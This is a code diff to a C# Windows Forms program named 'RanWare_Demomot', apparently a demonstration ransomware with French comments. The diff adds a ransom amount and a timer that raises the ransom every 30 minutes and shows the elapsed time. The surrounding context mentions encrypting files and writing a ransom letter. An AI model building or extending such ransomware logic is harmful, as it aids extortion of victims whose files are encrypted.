@@ -17,6 +17,9 @@ namespace RanWare_Demomot
         bool isDecripted;//Bool pour savoir si l'utilsiateur a decrypter ses fichiers
         List<string> filesName = new List<string>();//Liste qui va contenir les nom des fichiers
         int numberOfFiles;//Variables pour compter le nombre de fichiers encryptés
+        int elapsedSeconds = 0;//Compte le nombre de seconde pour les affichers
+        int numberOfSeconds = 0;//Compteur qui à toujours la même valeur que elapsedSecond mais qui va jusqu'au nimbre de seconde souhaité puis est remis à zéro
+        double amount = 1.5;//Montant de la rançon
 
         Random randomPos = new Random();//Position random du bouton "Stop the muisc"
         SoundPlayer nyanPlayer = new SoundPlayer(@"C:\Safe_Folder\RanWare_Demomot\RanWare_Demomot\Sound\Nyan.wav");//Son nyan
@@ -67,6 +70,7 @@ namespace RanWare_Demomot
             {
                 ransomLetter(filesName);//Crée un fichier texte affichant tous les fichiers encryptés
             }
+            //this.WindowState = FormWindowState.Maximized;//Met le programme en plein ecran
         }
 
         /// <summary>
@@ -401,6 +405,24 @@ namespace RanWare_Demomot
             nyanPlayer.Stop();
             poneyPlayer.PlayLooping();
             btnStop.Enabled = false;
+        }
+        /// <summary>
+        /// Méthode à chaque seconde
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void timer_Tick(object sender, EventArgs e)
+        {
+            elapsedSeconds++;
+            numberOfSeconds++;
+            TimeSpan time = TimeSpan.FromSeconds(elapsedSeconds);
+            lblTime.Text = time.ToString(@"hh\:mm\:ss");
+            if (numberOfSeconds == 1800)
+            {
+                amount += 0.5;
+                lblAmount.Text = Convert.ToString(amount);
+                numberOfSeconds = 0;
+            }
         }
     }
 }
